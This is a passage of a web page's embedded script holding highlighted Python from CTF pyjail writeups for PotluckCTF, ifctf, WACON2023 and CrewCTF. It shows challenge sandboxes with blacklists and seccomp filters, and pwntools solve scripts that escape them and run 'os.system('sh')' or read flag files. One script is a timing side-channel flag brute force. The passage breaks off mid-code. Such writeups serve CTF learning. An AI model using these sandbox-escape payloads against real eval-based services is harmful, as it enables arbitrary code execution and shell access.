    found <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token comment"># some dumb manual fixes</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"a"</span>
        var2 <span class="token operator">=</span> <span class="token string">"C"</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"C"</span>
        var2 <span class="token operator">=</span> <span class="token string">"a"</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"b"</span>
        var2 <span class="token operator">=</span> <span class="token string">"C"</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>
        var <span class="token operator">=</span> <span class="token string">"b"</span>
        var2 <span class="token operator">=</span> <span class="token string">"b"</span>
    <span class="token comment"># brute char</span>
    <span class="token keyword">for</span> brute <span class="token keyword">in</span> alph<span class="token punctuation">:</span>
        n <span class="token operator">=</span> ch<span class="token punctuation">[</span><span class="token number">1</span> <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span> <span class="token keyword">and</span> i<span class="token operator">!=</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span> <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"START"</span><span class="token punctuation">,</span>brute<span class="token punctuation">)</span>
        <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token string">"\\"</span>"<span class="token punctuation">:</span>
            char <span class="token operator">=</span> <span class="token string">"\\\\"</span><span class="token operator">+</span>char
        n <span class="token operator">=</span> n<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"CHAR"</span><span class="token punctuation">,</span>char<span class="token punctuation">)</span>
        n <span class="token operator">=</span> n<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"VAR1"</span><span class="token punctuation">,</span> var<span class="token punctuation">)</span>
        n <span class="token operator">=</span> n<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"VAR2"</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span>
        check <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>n<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        <span class="token keyword">if</span> check <span class="token operator">==</span> <span class="token number">69</span> <span class="token keyword">and</span> n <span class="token operator">==</span> n<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            out<span class="token punctuation">.</span>append<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span>
            found <span class="token operator">=</span> <span class="token boolean">True</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> found<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"COULDNT FIND VALID CHAR"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>

<span class="token comment"># verify payload works</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> p <span class="token keyword">in</span> out<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    <span class="token builtin">eval</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">"""
'Y\\',)"e"=:C(,',(C:="e"),'\\Y'
'Z\\',)"v"+C=:C(,',(C:=C+"v"),'\\Z'
'o\\',)"a"+C=:C(,',(C:=C+"a"),'\\o'
'd\\',)"l"+C=:C(,',(C:=C+"l"),'\\d'
'(\\',)"("+C=:C(,',(C:=C+"("),'\\('
'g\\',)"i"+C=:C(,',(C:=C+"i"),'\\g'
'b\\',)"n"+C=:C(,',(C:=C+"n"),'\\b'
'B\\',)"p"+C=:a(,',(a:=C+"p"),'\\B'
'=\\',)"u"+a=:C(,',(C:=a+"u"),'\\='
'=\\',)"t"+C=:b(,',(b:=C+"t"),'\\='
'j\\',)"("+b=:b(,',(b:=b+"("),'\\j'
'i\\',)")"+b=:b(,',(b:=b+")"),'\\i'
'i\\',)")"+b=:b(,',(b:=b+")"),'\\i'
'a\\',))b(lave(,',(eval(b)),'\\a'
"""</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge28.play.potluckctf.com'</span><span class="token punctuation">,</span><span class="token number">31337</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> p <span class="token keyword">in</span> out<span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'palindrome?'</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"__import__('os').system('sh')"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,me,Xn,ja,_u,ve,Kn,ip,kp,du,we,Zn,pf=`<code class="language-py"><span class="token comment">#!/usr/bin/env python3</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">locals</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'__build_class__'</span><span class="token punctuation">:</span> __build_class__<span class="token punctuation">,</span> <span class="token string">"print"</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>

        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span>
                <span class="token string">'''</span><span class="token punctuation">,</span> <span class="token string">'""'</span><span class="token punctuation">,</span> <span class="token string">'(('</span><span class="token punctuation">,</span> <span class="token string">'[['</span><span class="token punctuation">,</span> <span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'=='</span><span class="token punctuation">,</span>
                <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'11'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span>
                <span class="token string">'True'</span><span class="token punctuation">,</span> <span class="token string">'False'</span><span class="token punctuation">,</span> <span class="token string">'None'</span><span class="token punctuation">,</span> <span class="token string">'...'</span><span class="token punctuation">,</span>
                <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'**'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token string">'^'</span><span class="token punctuation">,</span> <span class="token string">'~'</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span>

        code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> code<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">any</span><span class="token punctuation">(</span>word <span class="token keyword">in</span> code <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Blacklisted word detected, exiting ..."</span><span class="token punctuation">)</span>
                exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token builtin">locals</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
        main<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,ge,Jn,rp,_p,fu,Ee,Qn,of=`<code class="language-py"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"challs.ifctf.fibonhack.it"</span><span class="token punctuation">,</span> <span class="token number">10010</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
for __name__ in __build_class__.__class__.__dir__.__qualname__:
    @__build_class__.__self__.exec
    @__build_class__.__self__.input
    class x:pass
"""</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#92;n"</span><span class="token punctuation">,</span><span class="token string">"&#92;r"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"__build_class__.__self__.print(__build_class__.__self__.open('./flag.txt').read())"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,he,ns,Ua,bu,xe,ss,dp,fp,yu,Le,as,ef=`<code class="language-py"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> secret
<span class="token keyword">import</span> pyseccomp
<span class="token keyword">import</span> sys

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Find the treasure!"</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

f <span class="token operator">=</span> pyseccomp<span class="token punctuation">.</span>SyscallFilter<span class="token punctuation">(</span>defaction<span class="token operator">=</span>pyseccomp<span class="token punctuation">.</span>KILL<span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'rt_sigaction'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'munmap'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'exit_group'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>add_rule<span class="token punctuation">(</span>pyseccomp<span class="token punctuation">.</span>ALLOW<span class="token punctuation">,</span> <span class="token string">'brk'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">del</span> pyseccomp
<span class="token keyword">del</span> f
<span class="token keyword">del</span> sys

__builtins__ <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token builtin">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>
exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code>`,Ce,ts,bp,yp,mu,Ae,ps,cf=`<code class="language-py">__builtins__ <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

some_unknown_and_very_long_identifier_name <span class="token operator">=</span> <span class="token string">"WACON2023&#123;[REDACTED]&#125;"</span></code>`,Te,os,mp,vp,vu,Fe,es,lf=`<code class="language-py"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> time
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"critical"</span>

<span class="token comment"># Find the offset for os._wrap_close on server (140)</span>
alph <span class="token operator">=</span> <span class="token string">b"&#123;&#125;0123456789abcdef"</span>
flag <span class="token operator">=</span> <span class="token string">"WACON2023&#123;"</span>
<span class="token comment"># flag = "WACON2023&#123;91d9cec468a8b22b57c2b091beb64bcc&#125;"</span>
index <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token string">"&#125;"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
    <span class="token keyword">for</span> guess <span class="token keyword">in</span> alph<span class="token punctuation">:</span>
        <span class="token comment"># sh = remote("1.234.10.246", 55555)</span>
        sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"python3"</span><span class="token punctuation">,</span> <span class="token string">"og.py"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''[a:=[].__class__.__base__.__subclasses__()[140].__init__.__builtins__,b:=a["__import__"],c:=b("secret").__dir__()[-1],d:=b("secret").__getattribute__(c),a["exec"]("while True:&#92;n&#92;tpass") if (a["ord"](d[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">]))==</span><span class="token interpolation"><span class="token punctuation">&#123;</span>guess<span class="token punctuation">&#125;</span></span><span class="token string"> else 1]'''</span></span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">:</span>
                index <span class="token operator">+=</span> <span class="token number">1</span>
                flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>
                sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">:</span>
            index <span class="token operator">+=</span> <span class="token number">1</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># [a:=[].__class__.__base__.__subclasses__()[140].__init__.__builtins__,a["exec"]("while True:&#92;n&#92;tpass") if True else 1]</span></code>`,De,cs,Pa,wu,Ie,ls,wp,gp,gu,He,us,uf=`<code class="language-py"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys

<span class="token keyword">class</span> <span class="token class-name">Nobuffers</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>stream <span class="token operator">=</span> stream

    <span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">writelines</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> datas<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">&#92;n"</span></span> <span class="token keyword">for</span> data <span class="token keyword">in</span> datas<span class="token punctuation">]</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__getattr__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> attr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>stream<span class="token punctuation">,</span> attr<span class="token punctuation">)</span>

banned <span class="token operator">=</span> re<span class="token punctuation">.</span>escape<span class="token punctuation">(</span><span class="token string">'\\(~&#125;?>&#123;&amp;/%&#96;)&lt;$|*=#!-+'0123456789;[] '</span><span class="token punctuation">)</span>
stdout <span class="token operator">=</span> Nobuffers<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span>
stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''

        __..,,-----l"|-.
    __/"__  |----""  |  i--voo..,,__
 .-'=|:|/|-------o.,,,---. Y88888888o,,_
_+=:_|_|__|_|   ___|__|___-|  """"&#96;"""&#96;----------.........___
__============:' "" |==|__===========(=>=+    |           ,_, .-"&#96;--..._
  ;="|"|  |"| &#96;.____|__|__/===========(=>=+----+===-|---------&lt;---------_=-
 | ==|:|/| |   | o|.-'__,-|   .'  _______|o  &#96;----'|        __ __,.-'"
  "&#96;--""&#96;--"'"""&#96;.-+------'" .'  _L___,,...-----------"""""""   "
                  &#96;------""""""""

'''</span><span class="token punctuation">)</span>

stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Enter command: '</span><span class="token punctuation">)</span>
prompt <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> prompt<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>banned<span class="token punctuation">&#125;</span></span><span class="token string">]'</span></span><span class="token punctuation">,</span> prompt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">exec</span><span class="token punctuation">(</span>prompt<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'__build_class__'</span><span class="token punctuation">:</span> __build_class__<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">:</span>__name__<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span></code>`,Oe,is,Ep,hp,Eu,Re,ks,kf=`<code class="language-py"><span class="token comment"># @quasar - eval("__import__('os').system('sh')")</span>
a <span class="token operator">=</span> <span class="token triple-quoted-string string">"""@__build_class__.__self__.eval
@__build_class__.__self__.bytes
@__build_class__.__self__.copyright._Printer__filenames.__add__
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@__build_class__.__self__.chr
@__build_class__.__self__.len
@__build_class__.__self__.StopAsyncIteration.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"sh".format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EncodingWarning.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@".system".format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@__build_class__.__self__.chr
@__build_class__.__self__.len
@__build_class__.__self__.StopAsyncIteration.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"os".format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EnvironmentError.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.append
@__build_class__.__self__.len
@__build_class__.__self__.EncodingWarning.__doc__.format
@__build_class__.__self__.copyright._Printer__filenames.extend
@__build_class__.__self__.list
@__build_class__.__self__.str.encode
@"__build_class__.__self__.__import__".format
class\fa:..."""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#92;n"</span><span class="token punctuation">,</span> <span class="token string">"&#92;r"</span><span class="token punctuation">)</span>

<span class="token comment"># @st4rn</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"starship-1.chal.crewc.tf"</span><span class="token punctuation">,</span> <span class="token number">40003</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'@__build_class__.__self__.exec&#92;r@__build_class__.__self__.input&#92;rclass\fx:pass'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'__build_class__.__self__.__import__("os").system("sh")'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,je,rs,Ba,hu,Ue,_s,xp,Lp,xu,Pe,ds,rf=`<code class="language-py"><span class="token comment"># @quasar - setting sys.stdout.flush to breakpoint</span>
<span class="token punctuation">[</span><span class="token builtin">id</span> <span class="token keyword">for</span> sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">.</span>__self__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span>mA<span class="token punctuation">]</span> <span class="token keyword">for</span> aA<span class="token punctuation">,</span>bA<span class="token punctuation">,</span>cA<span class="token punctuation">,</span>dA<span class="token punctuation">,</span>eA<span class="token punctuation">,</span>fA<span class="token punctuation">,</span>gA<span class="token punctuation">,</span>hA<span class="token punctuation">,</span>iA<span class="token punctuation">,</span>jA<span class="token punctuation">,</span>kA<span class="token punctuation">,</span>lA<span class="token punctuation">,</span>mA<span class="token punctuation">,</span>nA<span class="token punctuation">,</span>oA<span class="token punctuation">,</span>pA<span class="token punctuation">,</span>qA<span class="token punctuation">,</span>rA<span class="token punctuation">,</span>sA<span class="token punctuation">,</span>tA<span class="token punctuation">,</span>uA<span class="token punctuation">,</span>vA<span class="token punctuation">,</span>wA<span class="token punctuation">,</span>xA<span class="token punctuation">,</span>yA<span class="token punctuation">,</span>zA<span class="token punctuation">,</span>aB<span class="token punctuation">,</span>bB<span class="token punctuation">,</span>cB<span class="token punctuation">,</span>dB<span class="token punctuation">,</span>eB<span class="token punctuation">,</span>fB<span class="token punctuation">,</span>gB<span class="token punctuation">,</span>hB<span class="token punctuation">,</span>iB<span class="token punctuation">,</span>jB<span class="token punctuation">,</span>kB<span class="token punctuation">,</span>lB<span class="token punctuation">,</span>mB<span class="token punctuation">,</span>nB<span class="token punctuation">,</span>oB<span class="token punctuation">,</span>pB<span class="token punctuation">,</span>qB<span class="token punctuation">,</span>rB<span class="token punctuation">,</span>sB<span class="token punctuation">,</span>tB<span class="token punctuation">,</span>uB<span class="token punctuation">,</span>vB<span class="token punctuation">,</span>wB<span class="token punctuation">,</span>xB<span class="token punctuation">,</span>yB<span class="token punctuation">,</span>zB<span class="token punctuation">,</span>aC<span class="token punctuation">,</span>bC<span class="token punctuation">,</span>cC<span class="token punctuation">,</span>dC<span class="token punctuation">,</span>eC<span class="token punctuation">,</span>fC<span class="token punctuation">,</span>gC<span class="token punctuation">,</span>hC<span class="token punctuation">,</span>iC<span class="token punctuation">,</span>jC<span class="token punctuation">,</span>kC<span class="token punctuation">,</span>lC<span class="token punctuation">,</span>mC<span class="token punctuation">,</span>nC<span class="token punctuation">,</span>oC<span class="token punctuation">,</span>pC<span class="token punctuation">,</span>qC<span class="token punctuation">,</span>rC<span class="token punctuation">,</span>sC<span class="token punctuation">,</span>tC<span class="token punctuation">,</span>uC<span class="token punctuation">,</span>vC<span class="token punctuation">,</span>wC<span class="token punctuation">,</span>xC<span class="token punctuation">,</span>yC<span class="token punctuation">,</span>zC<span class="token punctuation">,</span>aD<span class="token punctuation">,</span>bD<span class="token punctuation">,</span>cD<span class="token punctuation">,</span>dD<span class="token punctuation">,</span>eD<span class="token punctuation">,</span>fD<span class="token punctuation">,</span>gD<span class="token punctuation">,</span>hD<span class="token punctuation">,</span>iD<span class="token punctuation">,</span>jD<span class="token punctuation">,</span>kD<span class="token punctuation">,</span>lD<span class="token punctuation">,</span>mD<span class="token punctuation">,</span>nD<span class="token punctuation">,</span>oD<span class="token punctuation">,</span>pD<span class="token punctuation">,</span>qD<span class="token punctuation">,</span>rD<span class="token punctuation">,</span>sD<span class="token punctuation">,</span>tD<span class="token punctuation">,</span>uD<span class="token punctuation">,</span>vD<span class="token punctuation">,</span>wD<span class="token punctuation">,</span>xD<span class="token punctuation">,</span>yD<span class="token punctuation">,</span>zD<span class="token punctuation">,</span>aE<span class="token punctuation">,</span>bE<span class="token punctuation">,</span>cE<span class="token punctuation">,</span>dE<span class="token punctuation">,</span>eE<span class="token punctuation">,</span>fE<span class="token punctuation">,</span>gE<span class="token punctuation">,</span>hE<span class="token punctuation">,</span>iE<span class="token punctuation">,</span>jE<span class="token punctuation">,</span>kE<span class="token punctuation">,</span>lE<span class="token punctuation">,</span>mE<span class="token punctuation">,</span>nE<span class="token punctuation">,</span>oE<span class="token punctuation">,</span>pE<span 